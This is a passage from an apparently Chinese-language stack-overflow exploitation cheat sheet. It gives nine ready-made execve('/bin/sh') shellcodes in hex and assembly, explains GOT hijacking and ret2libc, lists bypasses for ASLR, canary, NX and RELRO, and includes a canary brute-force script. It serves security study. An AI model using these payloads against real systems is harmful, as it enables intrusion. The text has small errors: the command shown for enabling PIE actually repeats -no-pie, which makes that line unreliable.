 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax  ; Get zero</span><br><span class="line">push eax  ; The string ending \x00</span><br><span class="line">push 0x68732f6e</span><br><span class="line">push 0x69622f2f  ; &quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">mov ebx, esp  ; ebx&#x3D;&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">; NULL at argv[1]</span><br><span class="line">push eax </span><br><span class="line">mov edx, esp  ; edx&#x3D;NULL</span><br><span class="line"></span><br><span class="line">; Address of &quot;&#x2F;&#x2F;bin&#x2F;sh&quot; at argv[0]</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp  ;ecx&#x3D;[&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">; Call execve</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86，18 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">push   0xb</span><br><span class="line">pop    eax</span><br><span class="line">push   ebx</span><br><span class="line">push   0x68732f2f</span><br><span class="line">push   0x6e69622f</span><br><span class="line">mov    ebx,esp</span><br><span class="line">int    0x80</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86，19 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">xchg ebx, esp</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86，24 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov al, 0x0b</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86-64，21 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rdi, &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86-64，23 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rsi, rsi</span><br><span class="line">push rsi</span><br><span class="line">mov rdi, 0x68732f2f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86-64，24 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rsi, rsi</span><br><span class="line">mov rbx, &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86-64，30 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mov rcx, 0x1168732f6e69622f ;move the immediate value &#x2F;bin&#x2F;sh in hex in </span><br><span class="line">;little endian byte order into rcx padded with 11</span><br><span class="line">shl rcx, 0x08               ;left shift to trim off the two bytes of padding    </span><br><span class="line">shr rcx, 0x08               ;ringht shift to re order string</span><br><span class="line">push rcx                    ;push the immediate value stored in rcx onto the stack</span><br><span class="line">lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi</span><br><span class="line">xor rdx, rdx                ;zero out rdx for an execve argument</span><br><span class="line">mov al, 0x3b                ;move 0x3b (execve sycall) into al to avoid nulls</span><br><span class="line">syscall                     ;make the syscall</span><br></pre></td></tr></table></figure>
</li>
<li><p>execve（x86-64，31 bytes）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rdi, rdi</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rax, rax</span><br><span class="line">push rax</span><br><span class="line">; 68 73 2f 2f 6e 69 62 2f</span><br><span class="line">mov rbx, 68732f2f6e69622fH</span><br><span class="line">push rbx</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="0x7-Libc"><a href="#0x7-Libc" class="headerlink" title="0x7 Libc"></a>0x7 Libc</h1><p>Getshell的方式之一。libc是Linux下的一组标准函数库，包含了C语言最基本的函数。当程序采用动态链接时，在加载程序的时候会将指定的libc链接到程序，若未指定则使用操作系统当前的libc，这样程序中才可以调用libc中提供的外部函数。当操作系统为程序加载完成libc以后，程序中需要调用的外部函数就会被放在内存中，libc中的每个函数地址都是一个偏移量，程序加载libc以后确定了libc的基地址，再加上libc中函数的偏移量就可以得到libc中函数在内存中的真实地址，当程序调用libc中的外部函数时，会通过plt表与got表跳转到该函数。</p>
<ul>
<li><p>PLT表(Procedure Linkage Table, 程序链接表，.plt段)</p>
<p>  用来存储程序中使用的外部函数的入口，也就是got表中对应的条目。位于代码段，编译时确定，没有写权限，无法修改。</p>
<p>  plt表中第一项的作用就是跳转到_dl_runtime_resolve函数，函数原型为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，该函数可以动态解析函数地址并且写入到got表中，最后还会调用被解析的函数。该条目一般由两条指令构成，第一条指令是push一个值到栈中，该值为_dl_runtime_resolve的第一个参数link_map_obj，也就是got表中的第一项，第二条指令是跳转到_dl_runtime_resolve函数的地址，调用该函数，也就是got表中的第二项。</p>
<p>  其余plt表项一般由3条指令构成，第一条指令跳转到对应的got表条目中存储的地址，第二条指令是push一个值到栈中，该值就是_dl_runtime_resolve的第二个参数reloc_index，第三条指令就是跳转到plt表的第一项，也就是调用动态链接器解析函数地址。plt表的结构如下所示。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">	push got[1]</span><br><span class="line">	jmp got[2]</span><br><span class="line">func@plt:</span><br><span class="line">	jmp func@got</span><br><span class="line">	push func_index</span><br><span class="line">	jmp plt[0]</span><br><span class="line">otherfunc@plt:</span><br><span class="line">	jmp otherfunc@got</span><br><span class="line">	push otherfunc_index</span><br><span class="line">	jmp plt[0]</span><br><span class="line">anotherfunc@plt:</span><br><span class="line">	jmp anotherfunc@got</span><br><span class="line">	push anotherfunc_index</span><br><span class="line">	jmp plt[0]</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>GOT表(Global Offset Table, 全局偏移表，.got.plt段)</p>
<p>  用来存储外部函数在内存中的地址，plt表与got表中的条目是一一对应的。位于数据段，可以动态修改，具有写权限。got表就是一个函数指针数组，其中got表的第一项got[0]是程序动态段(.dynamic)的装载地址，该段中保存了所有程序中需要使用的外部函数，got表的第二项got[1]是link_map_object的地址，也就是_dl_runtime_resolve的第一个参数，got表第三项got[2]是_dl_runtime_resolve函数的地址，其余条目为外部函数的地址，与plt表相对应，plt表与got表都对应关系如下所示。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           got[0] ---&gt; .dynamic address</span><br><span class="line">       |-&gt; got[1] ---&gt; link_map_object address</span><br><span class="line">plt[0] --&gt; got[2] ---&gt; _dl_runtime_resolve address</span><br><span class="line"></span><br><span class="line">plt[1] --&gt; got[3]</span><br><span class="line">plt[2] --&gt; got[4]</span><br><span class="line">plt[3] --&gt; got[5]</span><br><span class="line">...        ...</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>当程序使用动态链接时，采用一种被称为延迟绑定的技术以提高程序执行效率。虽然got表的作用是存储所有外部函数的地址，但是当程序刚开始运行时初始got表中所有的条目都指向plt表中对应的条目（即对应plt条目中的第二条指令push），而plt表中对应条目的作用除了跳转到got表中对应条目存储的地址，另外就是解析并且绑定该外部函数的地址，也就是说当程序第一次调用某个外部函数时，该函数的地址才会被解析并且写入到got表中，以后每次调用都会直接通过got表跳转到对应地址而不用重新解析地址。调用外部函数的过程如下所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/7.png"></p>
<ol>
<li>首先程序中第一次调用外部函数func，跳转到func@plt中</li>
<li>执行func@plt表中第一条指令，跳转到func@got</li>
<li>由于这是第一次调用func，所以func@got表中存储的是func@plt中的第二条指令地址，也就是func@plt+6</li>
<li>跳转到plt[0]准备执行_dl_runtime_resolve</li>
<li>执行_dl_runtime_resolve，并且修改对应的func@got表条目地址为真正的func地址，并且跳转到func函数的地址执行</li>
<li>第二次调用func函数，跳转到func@plt中</li>
<li>func@plt再跳转到func@got中</li>
<li>由于func@got已经被修改为func的真正地址，所以就可以直接跳转到func函数的地址执行，并且以后调用func函数时都可以直接执行，无需重新解析地址</li>
</ol>
<p>针对libc的利用主要是通过修改got表中的条目来控制执行流程，称为got表劫持（当然如果程序中有libc中的system函数调用就可以直接跳转到system@plt，不过一般很少出现这种情况）。前面已经知道got表就是一个函数指针数组，并且可写，所以只想办法获取system函数在加载到程序中的libc中的地址，就可以修改got表中某个函数的地址为system函数的地址，例如修改puts函数的地址，修改完成后以后每次调用puts都相当于调用system函数。</p>
<p>由于got表中只存储了程序中使用到的外部函数的地址，所以没有办法直接获取到system函数地址，但是如果知道程序使用的libc，就可以知道system函数在libc中的地址偏移，之后再从程序中想办法拿到libc的基地址，两者相加就可以知道system函数在程序中的真实地址。</p>
<p>一般的套路是想办法从程序中泄漏出一个libc库函数中某个函数的地址，例如puts函数。拿到puts函数的地址以后，由于libc的基地址低12位（低3个十六进制数）都是0，所以只需要函数地址的低12位（3个十六进制数）就可以通过偏移确定出程序使用libc版本，拿到libc以后就可以知道system函数与puts函数在libc中的偏移，计算出system函数地址的公式为<code>system地址 = puts地址 - pus偏移 + system偏移</code>，其中<code>puts地址-puts偏移</code>计算出的就是libc的基地址。计算出system的地址以后就可以通过其他方式修改got表中其他函数的地址，实现got表劫持，此外libc中一般都自带了字符串<code>/bin/sh</code>，只需要知道该字符串在libc中的偏移地址就无需自己构造该字符串。</p>
<p>需要注意的是libc中除了system还有一个函数execve也可以执行命令，由于system函数中可能会对内存对齐进行检查，导致执行失败，所以当使用system函数执行失败后可以在system函数之前的参数添加buf使内存对齐，或者改用execve函数。</p>
<p>此外，在没有开启PIE的情况下，got表的基地址是固定的，因此通过IDA获取got表中某条目的地址以后，修改该地址就可以劫持控制流，由于对应的plt表第一条指令就是jmp到got表对应条目中存储的地址，通过修改got表中的地址就可以直接劫持控制流，jmp到需要的地址，这是一种很常见的劫持控制流的方法。</p>
<p>为了方便我们写入<code>/bin/sh</code>，可以直接修改got表上的部分函数为system，例如<code>strlen(user_input),strcmp(user_input,xx),strncmp(user_input,xx),memcmp(user_input,xx),atoi(user_input),free(user_input)</code>，这些函数都可以直接接收用户输入作为参数，修改为system就可以。</p>
<h1 id="0x8-Protection-Bypass"><a href="#0x8-Protection-Bypass" class="headerlink" title="0x8 Protection Bypass"></a>0x8 Protection Bypass</h1><ul>
<li><p>ASLR（Address Space Layout Randomization，地址空间布局随机化）</p>
<p>  一种由操作系统提供的保护机制，将部分内存基地址随机化使攻击者无法预测地址。大部分操作系统都默认开启ASLR。</p>
<p>  ASLR主要有3个级别：</p>
<ul>
<li><p>0 — 关闭ASLR，每次加载程序的堆栈，libc等地址均相同</p>
</li>
<li><p>1 — 开启ASLR，主要影响mmap基地址，栈基地址，libc基地址</p>
</li>
<li><p>2 — 开启强化ASLE，在1级别的基础上增加了堆随机化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置ASLR，注意在Docker中无法关闭ASLR</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>Canary（金丝雀）</p>
<p>  以前的矿工下矿之前为了检查矿井内是否有有毒气体，通常会将一只金丝雀送进去，如果金丝雀死了，就代表矿洞内有有毒气体（也有版本说是盗墓者盗墓会用金丝雀判断墓穴内是否有有毒气体）。</p>
</li>
</ul>
<pre><code>Canary是一种防止栈溢出的保护机制，其原理为在程序的入口处首先从fs/gs寄存器偏移0x28处取出4或8个字节（取决于操作系统位数）压入栈中，之后在开辟其他局部变量栈帧，当函数执行结束以后再检查该值是否与之前相同，若相同则正常退出函数，否则检测到发生栈溢出，调用\_\_stack\_chk\_fail函数强制终止程序运行。为了避免canary被其上方的局部变量一起打印输出，canary通常以0x00结尾以截断canary上面局部变量的字符串。编译器通常默认不开启canary保护。Canary在栈中结构如下所示。

![](/StackOverflow-CheatSheet/8.png)



\_\_stack\_chk\_fail函数原型如下

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭canary</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启canary，但是只会为局部变量中含有char数组的函数开启</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 为所有函数开启canary</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></code></pre>
<ul>
<li><p>NX（No Execute，堆栈不可执行）</p>
<p>  将堆栈内存页标记为不可执行，当控制流程转入堆栈上以后，CPU若尝试在堆栈上执行指令时就会引发异常。编译器通常默认开启NX。</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭NX</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启NX</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>PIE（Position Independent Executable，地址无关代码）</p>
<p>  基于ASLR的代码段与数据段地址随机化技术，需要编译器将程序编译成位置无关，并链接为ELF共享对象，程序每次加载到内存中以后代码地址与数据地址均不同，主要影响代码段(.text)，数据段(.data)与全局数据段(.bss)。注意只有开启了ASLR，PIE才会生效，编译器通常默认开启PIE。</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>RELRO（Read Only Relocation，重定向只读）</p>
<p>  将经过动态链接器处理过后的内存区域设置为只读权限以避免got表劫持这类攻击方式。RELRO通常有两种：</p>
<ul>
<li><p>Partial RELRO</p>
<p>  影响部分通过动态链接器处理的内存段(.init_array .fini_array .jcr .dynamic .got)并且设置为只读，但是got表(.got.plt)还是可写的</p>
</li>
<li><p>Full RELRO</p>
<p>  在Partial RELRO的基础上经用了延迟绑定，got表中所有条目在程序刚加载libc的时候全部解析完成，并且将got表设置为只读。</p>
</li>
</ul>
</li>
</ul>
<pre><code>编译器通常默认开启Partial RELRO。

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启Partial RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启Full RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></code></pre>
<h2 id="0x80-常用绕过"><a href="#0x80-常用绕过" class="headerlink" title="0x80 常用绕过"></a>0x80 常用绕过</h2><ol>
<li><p>ret2text</p>
<p> 修改返回地址到程序中已经存在的代码处，例如有些程序中可能提供了执行系统命令的方法。</p>
</li>
<li><p>ret2syscall</p>
<p> 如0x5节中所提到的，通过ROP构造系统调用execve执行命令。</p>
</li>
<li><p>ret2shellcode</p>
<p> 如0x6节中所提到的，通过将shellcode写入某处具有可执行权限的内存并且执行shellcode，shellcode通常也是一段进行系统调用的二进制代码。</p>
</li>
<li><p>ret2libc</p>
<p> 如0x7节中所提到的，通过程序中泄漏的libc地址来获取system函数在libc中的真实地址，从而跳转到libc中的system函数执行命令。</p>
</li>
</ol>
<h2 id="0x81-Bypass-ASLR"><a href="#0x81-Bypass-ASLR" class="headerlink" title="0x81 Bypass ASLR"></a>0x81 Bypass ASLR</h2><p>ASLR是最常见的保护措施，有很多种基础的方法可以绕过，大部分方法在前文中均介绍过。</p>
<ol>
<li><p>nop垫</p>
<p> 若没有开启NX（比较少见），则可以将shellcode写入栈上，但是由于无法确定shellcode准确的地址，因此可以在shellcode前面填充大量的nop指令（0x90，也称为nop垫，该指令什么也不做），跳转的时候可以跳转到一个大致的范围，只要命中了一个nop垫，就可以一直滑行到shellcode，nop垫填充的越多，命中的概率越大。</p>
</li>
<li><p>泄漏libc基地址</p>
<p> 最常用的办法，如0x7节中所讲， 先泄漏出libc中某个函数的地址以后再计算出其他函数的地址，此类攻击方法要求程序必须一次执行可以多次输入输出。</p>
</li>
<li><p>爆破libc基地址</p>
<p> 由于libc基地址的随机化只会影响一个字节也就是8位，所以最多只需要爆破256次就可以爆破出正确的libc基地址。libc基地址的最后12位（3个十六进制数）都是0，从倒数第20位到倒数第12位这8位每次都会改变，其余位不变，例如0xf7fxx000，其中xx为每次改变的字节。该攻击方法需要提前知道libc版本。</p>
</li>
<li><p>修改got表</p>
<p> 比较常用的办法。如0x7节中修改got表的方法，可以将got表项修改为某个libc函数地址，如果没有开启PIE，也可以修改为ROP链的起始地址。</p>
</li>
<li><p>ROP链</p>
<p> 也是非常常用的办法，如果没有开启PIE则可以直接构造ROP链。</p>
</li>
</ol>
<h2 id="0x82-Bypass-Canary"><a href="#0x82-Bypass-Canary" class="headerlink" title="0x82 Bypass Canary"></a>0x82 Bypass Canary</h2><p>比较令人烦恼的保护措施，canary主要为了防止栈溢出，并且canary最后一个字节为0x00。</p>
<ol>
<li><p>泄漏canary</p>
<p> 最常用的方法。为了避免canary被其他局部变量附带输出，所以canary通常以0x00结尾以截断canary上面的局部变量，因此可以通过栈溢出覆盖掉canary最后的0x00，使其可以被附带输出，即可泄漏canary，拿到canary以后溢出的时候将canary填写到对应的位置即可绕过。</p>
</li>
<li><p>爆破canary</p>
<p> 程序每次启动后canary是不同的，但是对于同一个进程，由于子进程会拷贝父进程的内存，子线程与父线程共用内存，所以一个程序的子进程和子线程的canary都是相同的，因此如果程序可以多次fork子进程或者启动子线程，那么就可以在子进程或子线程中爆破canary。</p>
</li>
</ol>
<pre><code>对于爆破过程，采用逐字节爆破是最高效的，每次爆破最低的一个字节（8位，16\*16=256次），从0x00到0xff，并且canary的结尾必是`\x00`，因此32位只需要爆破3个字节（256\*3=768次），64位只需要爆破7个字节（256\*7=1792次）。



爆破canary的脚本如下

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">      ret = send_and_recv(p + chr(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ret:</span><br><span class="line">         canary += chr(i)</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;[+] Find 0x%02x&quot;</span> % i</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;[-] Brute failed&quot;</span></span><br><span class="line">         sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = canary[stop:start<span class="number">-1</span>:<span class="number">-1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] Got canary: 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure></code></pre>
<ol start="3">
<li><p>劫持__stack_chk_fail</p>
<p> 该函数在canary对比失败以后会被调用，该函数会强制终止程序。该函数属于libc，因此函数地址在got表中，通过劫持got表可以修改该函数从而使程序不会被终止。此外由于该函数在终止前还会打印出argv[0]的内容（也就是程序名），因此如果可以获取到argv在libc中的地址，并且修改argv，就可以通过该函数打印出需要的数据。</p>
</li>
<li><p>修改canary</p>
<p> 在前文中提到过，函数中的canary是从fs/gs寄存器偏移0x28处取出4或8个字节，实际上fs/gs寄存器偏移0x28处是TLS(thread local storage，线程局部存储)中的stack_guard值，因此如果可以修改TLS中的stack_guard就可以修改canary。</p>
</li>
</ol>
<h2 id="0x83-Bypass-NX"><a href="#0x83-Bypass-NX" class="headerlink" title="0x83 Bypass NX"></a>0x83 Bypass NX</h2><p>NX为了防止堆栈上的shellcode，也很常见。开启NX以后就不能直接把shellcode写入堆栈上，但是可以想办法找到其他具有可执行权限的段去写，不过Bypass NX最常用的方法就是ROP，使用ROP只需要把ROP链的各个地址与参数压入栈中，最终跳转到shellcode地址或者构造系统调用，ROP的执行过程还是在代码段中。或者可以如0x7中所介绍的攻击方法，总之开启了NX就代表堆栈上无法执行任何代码。</p>
